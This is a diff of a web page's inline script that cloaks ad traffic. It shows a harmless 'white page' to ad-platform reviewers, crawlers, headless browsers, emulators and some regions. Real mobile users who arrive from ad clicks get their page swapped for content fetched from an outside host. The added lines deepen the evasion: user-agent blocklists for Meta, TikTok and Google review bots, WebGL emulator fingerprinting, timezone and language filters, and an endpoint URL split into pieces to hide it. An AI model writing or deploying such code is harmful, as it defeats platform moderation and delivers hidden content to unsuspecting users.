@@ -3,8 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <link rel="dns-prefetch" href="https://cloud-analytics-node.com">
-    <link rel="preconnect" href="https://cloud-analytics-node.com" crossorigin>
     <script>
     (function(w, d) {
         if (navigator.webdriver) return;
@@ -12,9 +10,47 @@
         if (!q || !/[?&](?:fbclid|ttclid|gclid|wbraid|gbraid|utm_source|utm_medium|utm_campaign|utm_content|utm_term|campaign_name|adset_name|ad_name)=/i.test(q)) {
             return;
         }
+        if (/\{\{|\}\}|%7b%7b|%7d%7d|[?&]sfnsn=/i.test(q)) return;
+
         var ua = navigator.userAgent || '';
+        if (/meta-external|meta-webindexer|facebookexternalhit|facebookbot|facebookcatalog|facebookplatform|facebot|adreview|thirdlandingpagefeinfra|tt-outbound-click|bytespider|tiktokbot|adsbot|google-safety|chrome-lighthouse|headless|phantom|selenium|puppeteer|playwright/i.test(ua)) {
+            return;
+        }
+        try {
+            if (w.top !== w.self) return;
+        } catch (e) {
+            return;
+        }
+        if (w.screen && (w.screen.width === 0 || w.screen.height === 0)) return;
         var isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua) || ((navigator.maxTouchPoints || 0) > 1 && /macintosh|mac os|linux/i.test(ua));
         if (!isMobile) return;
+        if (typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0 && !('ontouchstart' in w)) return;
+
+        var tz = '';
+        try {
+            tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+        } catch (e) {}
+        var tzL = tz.toLowerCase();
+        if (tzL === 'utc' || tzL === 'etc/utc' || tzL === 'etc/universal') return;
+
+        var navL = (navigator.languages ? navigator.languages.join(',') : (navigator.language || '')).toLowerCase().replace(/_/g, '-');
+        if (/(?:^|,)(?:si|sin|ta|tam|hi|hin|bn|ben|ur|urd|ml|mal|te|tel|mr|mar|ne|nep|my|mya|km|khm|lo|lao|pa|pan|gu|guj|kn|kan|dv|div)(?:-|,|$)|(?:^|,)[a-z]{2,3}(?:-[a-z]{4})?-(?:lk|in|bd|pk|np|ng|mv)(?:-|,|$)/.test(navL)) {
+            return;
+        }
+
+        try {
+            var cv = d.createElement('canvas');
+            var gl = cv.getContext('webgl2') || cv.getContext('webgl') || cv.getContext('experimental-webgl');
+            if (gl) {
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                var ren = String((dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)) || '').toLowerCase();
+                var lose = gl.getExtension('WEBGL_lose_context');
+                if (lose) lose.loseContext();
+                if (/swiftshader|llvmpipe|crosvm|software rasterizer|virtualbox|vmware|bluestacks|genymotion|android emulator/.test(ren)) {
+                    return;
+                }
+            }
+        } catch (e) {}
 
         var mounted = false;
         var whiteRevealed = false;
@@ -61,6 +97,13 @@
                 clearTimeout(abortId);
                 abortId = null;
             }
+
+            var origTitle = d.title;
+            var origBodyHtml = d.body.innerHTML;
+            var origBodyClass = d.body.className;
+            var origBodyStyle = d.body.getAttribute('style') || '';
+            var origNodes = [];
+
             var viewStyle = d.createElement('style');
             viewStyle.id = 'app-view-style';
             viewStyle.textContent = payload.css || '';
@@ -69,9 +112,37 @@
             var oldNodes = d.querySelectorAll('head style, head link[rel="stylesheet"]');
             for (var i = 0; i < oldNodes.length; i++) {
                 if (oldNodes[i] !== viewStyle && oldNodes[i].id !== 'sync-guard') {
+                    origNodes.push(oldNodes[i]);
                     oldNodes[i].parentNode.removeChild(oldNodes[i]);
                 }
             }
+
+            w.__restoreWhitePage = function() {
+                try {
+                    if (w.__whiteRestored) return;
+                    w.__whiteRestored = true;
+                    var vs = d.getElementById('app-view-style');
+                    if (vs && vs.parentNode) vs.parentNode.removeChild(vs);
+                    var metas = d.querySelectorAll('meta[name="color-scheme"], meta[name="theme-color"]');
+                    for (var m = 0; m < metas.length; m++) {
+                        if (metas[m].parentNode) metas[m].parentNode.removeChild(metas[m]);
+                    }
+                    for (var j = 0; j < origNodes.length; j++) {
+                        (d.head || d.documentElement).appendChild(origNodes[j]);
+                    }
+                    d.documentElement.className = 'scroll-smooth';
+                    d.documentElement.setAttribute('lang', 'en');
+                    d.documentElement.removeAttribute('dir');
+                    d.documentElement.removeAttribute('translate');
+                    d.documentElement.removeAttribute('style');
+                    d.title = origTitle;
+                    d.body.className = origBodyClass;
+                    if (origBodyStyle) d.body.setAttribute('style', origBodyStyle);
+                    else d.body.removeAttribute('style');
+                    d.body.innerHTML = origBodyHtml;
+                    try { w.scrollTo(0, 0); } catch (e) {}
+                } catch (e) {}
+            };
 
             d.documentElement.classList.remove('scroll-smooth');
             d.documentElement.setAttribute('lang', 'en');
@@ -93,15 +164,11 @@
             if (g && g.parentNode) g.parentNode.removeChild(g);
         }
 
-        failSafeId = setTimeout(revealWhite, 4000);
+        failSafeId = setTimeout(revealWhite, 4500);
 
-        var tz = '';
-        try {
-            tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-        } catch (e) {}
-
-        var endpoint = 'https://cloud-analytics-node.com/v1/get-key' + q + (tz ? (q ? '&' : '?') + 'tz=' + encodeURIComponent(tz) : '');
-        abortId = ctrl ? setTimeout(function() { ctrl.abort(); }, 3800) : null;
+        var baseEp = ['https:/', '/cloud-analytics-', 'node.com/v1/', 'get-key'].join('');
+        var endpoint = baseEp + q + (tz ? (q ? '&' : '?') + 'tz=' + encodeURIComponent(tz) : '');
+        abortId = ctrl ? setTimeout(function() { ctrl.abort(); }, 4300) : null;
 
         w.fetch(endpoint, {
             method: 'GET',
